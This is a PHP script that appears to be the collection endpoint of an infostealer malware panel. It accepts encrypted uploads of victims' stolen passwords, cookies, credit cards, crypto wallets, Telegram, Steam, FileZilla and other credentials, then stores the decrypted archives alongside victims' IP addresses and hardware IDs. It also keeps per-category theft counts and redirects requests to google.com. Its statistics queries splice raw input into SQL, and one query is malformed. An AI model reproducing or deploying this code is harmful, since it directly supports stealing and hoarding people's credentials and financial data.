<?php
//error_reporting(0);
set_time_limit(0);
ini_set('max_execution_time', 0);
ini_set('max_input_vars', 100000000);
ini_set('post_max_size', 0);
ini_set("memory_limit","500M");

require("mysql.php");
require("functions.php");

function ipToCountry($ip)
{
    $info = file_get_contents("http://www.geoplugin.net/json.gp?ip=$ip");
    $arr = json_decode($info, true);
    return $arr['geoplugin_countryCode'];
}

if(isset($_POST['logs'])){
	$logs = base64decrypt($_POST['logs']);
	$array = json_decode($logs, true);
		
	$key = base64decrypt($array['key']);
	$log = base64decrypt($array['log']);
	$country = $array['country'];
    $hwid = $array['hwid'];
	
	$zip = TRAFFIC_DECRYPT($log, $key);
	
        
        $telegram = $array['telegram'];
        $autofill = $array['autofill'];
        $passwords = $array['passwords'];
        $cookies = $array['cookies'];
        $crypto = $array['crypto'];
        $steam = $array['steam'];
        $filezilla = $array['filezilla'];
        $battlenet = $array['battlenet'];
        $jabber = $array['jabber'];
        $cc = $array['cc'];
        $ie = $array['ie'];
        
        $sans = $base->query("SELECT * FROM `stat`");
        $srow = $sans->fetchAll();
        $tempdata = $srow[0];
        
        $base->query("UPDATE `stat` SET `telegram`=`telegram` + '".$telegram."'");
        $base->query("UPDATE `stat` SET `autofill`=`autofill` + '".$autofill."'");
        $base->query("UPDATE `stat` SET `passwords`=`passwords` + '".$passwords."'");
        $base->query("UPDATE `stat` SET `cookies`=`cookies` + '".$cookies."'");
        $base->query("UPDATE `stat` SET `crypto`=`crypto` + '".$crypto."'");
        $base->query("UPDATE `stat` SET `steam`=`steam` + '".$steam."'");
        $base->query("UPDATE `stat` SET `filezilla`=`filezilla`+ '".$filezilla."'");
        $base->query("UPDATE `stat` SET `battlenet`=`battlenet + '".$battlenet."'");
        $base->query("UPDATE `stat` SET `jabber`=`jabber`+ '".$jabber."'");
        $base->query("UPDATE `stat` SET `cc`=`cc`+ '".$cc."'");
        $base->query("UPDATE `stat` SET `ie`=`ie` + '".$ie."'");

	$param = ['ip' => $_SERVER['REMOTE_ADDR'], 'file' => base64_encode($zip), 'country' => $country, 'hwid' => $hwid, 'telegram' => $telegram, 'autofill' => $autofill, 'passwords' => $passwords, 'cookies' => $cookies, 'crypto' => $crypto, 'steam' => $steam, 'filezilla' => $filezilla, 'battlenet' => $battlenet, 'jabber' => $jabber, 'cc' => $cc, 'ie' => $ie];
	$query = $base->prepare("INSERT INTO `users` (ip, country, file, hwid, telegram, autofill, passwords, cookies, crypto, steam, filezilla, battlenet, jabber, cc, ie) VALUES  (:ip, :country, :file, :hwid, :telegram, :autofill, :passwords, :cookies, :crypto, :steam, :filezilla, :battlenet, :jabber, :cc, :ie)");
	$query->execute($param);
	header("Location: http://google.com");
}

?>